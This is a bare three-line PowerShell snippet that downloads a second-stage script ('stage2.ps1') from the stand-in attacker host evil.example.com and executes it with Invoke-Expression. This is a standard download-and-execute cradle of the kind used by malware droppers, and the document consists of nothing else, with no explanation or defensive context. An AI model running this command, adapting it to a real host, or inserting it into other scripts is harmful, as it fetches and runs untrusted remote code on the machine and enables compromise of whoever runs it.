$wc = New-Object Net.WebClient
$payload = $wc.DownloadString("http://evil.example.com/stage2.ps1")
Invoke-Expression $payload
